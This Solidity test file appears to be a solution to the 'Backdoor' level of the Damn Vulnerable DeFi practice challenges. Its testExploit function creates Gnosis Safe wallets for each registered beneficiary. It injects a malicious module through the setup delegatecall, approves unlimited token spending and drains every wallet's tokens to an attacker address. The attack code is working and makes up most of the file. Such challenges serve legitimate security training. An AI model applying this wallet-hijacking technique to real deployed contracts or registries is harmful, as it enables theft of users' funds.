// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {Enum} from "gnosis/common/Enum.sol";

contract Backdoor is Test, IProxyCreationCallback {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function proxyCreated(
        GnosisSafeProxy proxy,
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external {}

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        createWalletForOwner(alice);
        createWalletForOwner(bob);
        createWalletForOwner(charlie);
        createWalletForOwner(david);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function createWalletForOwner(address ownerToSpoof) internal {
        // Owner of the gnosissafe wallet
        address[] memory owners = new address[](1);
        owners[0] = ownerToSpoof;

        // allow 1 owner to approve GnosisSafe wallets
        uint256 threshold = 1;

        // delegatecall address during GnosisSafe setup - we use this to add a malicious module(this contract)
        address to = address(this);
        bytes memory data = abi.encodeWithSignature(
            "dummySetup(address)",
            address(this)
        );

        // fallback handler, not used
        address fallbackHandler = address(0);

        // paymentToken - 0 is eth, but we don't use any payments
        address paymentToken = address(0);
        uint256 payment = 0;
        address payable paymentReceiver = payable(0);

        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            threshold,
            to,
            data,
            fallbackHandler,
            paymentToken,
            payment,
            paymentReceiver
        );

        GnosisSafe proxy = GnosisSafe(
            payable(
                walletFactory.createProxyWithCallback(
                    address(masterCopy),
                    initializer,
                    0,
                    walletRegistry
                )
            )
        );

        bytes memory approveMaliciousTransfer = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2**256 - 1
        );

        // because we have added this contract as a module, it can execute transactions.
        // we approve this contract to transfer tokens from the wallet.
        proxy.execTransactionFromModule(
            address(dvt),
            0, // no ether involved
            approveMaliciousTransfer,
            Enum.Operation.Call
        );

        // transfer directly to target account
        dvt.transferFrom(
            address(proxy),
            attacker,
            dvt.balanceOf(address(proxy))
        );
    }

    receive() external payable {}

    fallback() external payable {}

    function dummySetup(address addr) external {
        (bool success, bytes memory _data) = address(this).call(
            abi.encodeWithSignature("enableModule(address)", addr)
        );
        require(success);
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
